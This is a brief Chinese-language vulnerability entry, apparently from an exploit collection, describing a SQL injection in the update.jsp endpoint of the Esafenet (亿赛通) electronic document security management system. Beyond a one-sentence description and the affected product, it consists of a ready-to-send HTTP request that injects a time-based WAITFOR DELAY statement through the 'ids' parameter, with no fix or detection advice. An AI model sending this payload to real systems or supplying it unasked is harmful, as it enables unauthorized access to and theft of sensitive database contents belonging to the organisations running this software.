### 漏洞描述：

亿赛通/update接口下存在sql注入漏洞，flag对输入的数据没有进行严格的过滤而导致SQL注入，攻击者可以利用该漏洞获取数据库敏感信息。

### 影响版本：

亿赛通电子文档安全管理系统

### Payload：
```
GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:1%27-- HTTP/1.1
Host:host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=0E05880315C89F32A53653313D83EC57; JSESSIONID=ACDE6D30E6BCEC22E1F90536FEEBD951
Upgrade-Insecure-Requests: 1
Content-Length: 0
```
